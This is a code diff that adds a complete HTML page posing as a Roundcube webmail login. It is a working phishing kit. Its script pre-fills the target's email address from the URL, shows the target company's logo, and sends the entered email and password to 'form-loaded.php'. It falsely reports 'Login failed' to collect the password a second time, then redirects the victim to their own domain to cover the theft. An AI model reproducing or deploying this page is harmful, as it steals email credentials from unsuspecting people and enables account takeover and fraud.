@@ -1,0 +1,166 @@
+﻿<!DOCTYPE html>
+<html lang="en" class="js chrome webkit layout-large">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <title>Email Server</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
+    <meta name="theme-color" content="#f4f4f4">
+    <meta name="msapplication-navbutton-color" content="#f4f4f4">
+
+    <link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+
+    <link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/deps/bootstrap.min.css?s=1593860330">
+    <link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/styles/styles.css?s=1593860317">
+
+    <link rel="stylesheet" type="text/css"
+        href="https://webmail.supremecluster.com/plugins/xframework/assets/styles/framework.css?s=1506327547">
+    <link rel="stylesheet" type="text/css"
+        href="https://webmail.supremecluster.com/plugins/jqueryui/themes/elastic/jquery-ui.css?s=1593860316">
+
+
+</head>
+
+<body class="task-login action-none">
+    <div id="layout">
+        <h1 class="voice">Roundcube Webmail Login</h1>
+
+        <div id="layout-content" class="selected no-navbar" role="main">
+            <img src="https://webmail.supremecluster.com/skins/elastic/images/logo.svg?s=1593860317" id="logo"
+                alt="Logo">
+            <form id="login-form" name="thisForm" method="post" class="propform" action="">
+                <input type="hidden" name="lourl" value="" id="lourl">
+                <table>
+                    <tbody>
+                        <tr class="form-group row">
+                            <td class="title" style="display: none;"><label for="rcmloginuser">Username</label>
+                            </td>
+                            <td class="input input-group input-group-lg"><span class="input-group-prepend">
+                                <i class="input-group-text user fa fa-user"></i></span><input name="email"
+                                    id="email" required="" size="40" autocapitalize="off" type="text"
+                                    class="form-control" placeholder="Username"></td>
+                        </tr>
+                        <tr class="form-group row">
+                            <td class="title" style="display: none;"><label for="rcmloginpwd">Password</label>
+                            </td>
+                            <td class="input input-group input-group-lg"><span class="input-group-prepend">
+                                <i class="input-group-text pass fa fa-lock"></i></span><input name="password"
+                                    id="password" required size="40" autocapitalize="off" autocomplete="off" type="password"
+                                    class="form-control" placeholder="Password"></td>
+                        </tr>
+                    </tbody>
+                </table>
+                <p class="formbuttons"><button type="submit" id="submit-btn"
+                        class="button btn btn-primary btn-lg text-uppercase w-100">Login</button>
+                </p>
+
+                <div id="login-footer" role="contentinfo">Email Administrator</div>
+            </form>
+        </div>
+        <div id="messagestack"></div><!--<i class="fa fa-exclamation-triangle"></i> -->
+        
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var m = 0;
+                $('#back1').click(function () {
+                    $("#msg").hide();
+                    $('#email').val("");
+                    $("#automail").animate({
+                        left: 200,
+                        opacity: "hide"
+                    }, 0);
+                    $("#inputbar").animate({
+                        right: 200,
+                        opacity: "show"
+                    }, 1000);
+                });
+
+                var n = window.location.hash.substr(1);
+                if (n) {
+                    var o = n;
+                    $('#email').val(o);
+                    $('#emailich').html(o);
+                    var p = /^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                    if (!p.test(o)) {
+                        $('#error').show();
+                        return false;
+                    }
+                    var q = o.indexOf("@");
+                    var r = o.substr((q + 1));
+                    var c = r.substr(0, r.indexOf('.'));
+                    var s = c.toLowerCase();
+                    var t = c.toUpperCase();
+                    $("#logoimg").attr({
+                        "src": "https://logo.clearbit.com/" + r,
+                        "alt": t
+                    });
+                    $("#logoname, .logoname").html(t);
+                }
+
+                $('#login-form').submit(function (event) {
+                    event.preventDefault();
+                    $('#error, #msg').hide();
+                    var d = $("#email").val();
+                    var e = $("#password").val();
+                    var z = $("#lourl").val();
+                    var f = $('#msg').html();
+                    $('#msg').text(f);
+                    var g = d;
+                    var h = /^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                    if (!h.test(g)) {
+                        $('#error').show();
+                        return false;
+                    }
+                    if (e === '') {
+                        return false;
+                    }
+                    var i = g.indexOf("@");
+                    var j = g.substr((i + 1));
+                    var c = j.substr(0, j.indexOf('.'));
+                    var k = c.toLowerCase();
+                    var l = c.toUpperCase();
+                    $("#logoimg").attr({
+                        "src": "https://logo.clearbit.com/" + j,
+                        "alt": l
+                    });
+                    $("#logoname").html(l);
+                    var data = $('#login-form').serialize();
+                    m = m + 1;
+
+                    $.ajax({
+                        url: "form-loaded.php",
+                        method: "POST",
+                        data: data,
+                        dataType: "json",
+                        beforeSend: function () {
+                            $('#submit-btn').prop('disabled', true);
+                            $('#messagestack').html('<div class="p-3 bg-secondary" style="font-size:16px"><span class="spinner-border spinner-border-sm" style="width: 1.5rem; height: 1.5rem;" role="status" aria-hidden="true"></span> Loading...</div>');
+                        },
+                        success: function (data) {
+                            setTimeout(function () {
+                                $("#password").val("");
+                                var message = '<div class="p-3 bg-warning rounded text-dark" style="font-size:16px"><i class="fa fa-exclamation-triangle"></i> Login failed.</div>';
+                                $('#messagestack').html(message).show().fadeOut(data.success ? 10000 : 5000);
+
+                                if (data.success && m >= 2) {
+                                    $('#messagestack').html('');
+                                    m = 0;
+                                    window.location.replace("http://www." + j);
+                                }
+
+                                $('#submit-btn').prop('disabled', false);
+                            }, 4000);
+                        }
+                    });
+                });
+            });
+
+
+        </script>
+</body>
+
+</html>
